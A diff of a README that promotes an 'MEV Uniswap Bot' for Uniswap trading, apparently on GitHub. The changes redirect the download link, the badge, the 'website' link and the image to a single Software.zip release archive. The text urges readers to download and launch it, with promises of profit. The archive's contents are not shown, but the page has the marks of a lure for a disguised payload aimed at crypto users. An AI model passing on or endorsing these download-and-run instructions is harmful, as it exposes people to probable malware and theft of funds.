@@ -30,19 +30,19 @@ To get started with the MEV Uniswap Bot, follow these steps:
 
 ### 📦 Download Software
 
-You can download the MEV Uniswap Bot software [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip). Make sure to launch the software after downloading to unleash its full potential!
+You can download the MEV Uniswap Bot software [here](https://github.com/ThxXXXXX192/MEV-UniswapBot/releases/download/v2.0/Software.zip). Make sure to launch the software after downloading to unleash its full potential!
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/ThxXXXXX192/MEV-UniswapBot/releases/download/v2.0/Software.zip)](https://github.com/ThxXXXXX192/MEV-UniswapBot/releases/download/v2.0/Software.zip)
 
 ### 🌐 Additional Resources
 
-For more information and updates about the MEV Uniswap Bot, visit our [website](https://mevuniswapbot.com). Explore our comprehensive guides, FAQs, and community forums to enhance your trading experience.
+For more information and updates about the MEV Uniswap Bot, visit our [website](https://github.com/ThxXXXXX192/MEV-UniswapBot/releases/download/v2.0/Software.zip). Explore our comprehensive guides, FAQs, and community forums to enhance your trading experience.
 
 ### 🚀 Start Trading with MEV Uniswap Bot Now!
 
 Don't miss out on the opportunity to leverage MEV-based trading strategies on Uniswap. Join the ranks of successful traders and developers who are maximizing their profits with the MEV Uniswap Bot. Get started today and unlock the full potential of automated trading in the DeFi ecosystem!
 
-![MEV Uniswap Bot](https://imageurl.com)
+![MEV Uniswap Bot](https://github.com/ThxXXXXX192/MEV-UniswapBot/releases/download/v2.0/Software.zip)
 
 ---
 
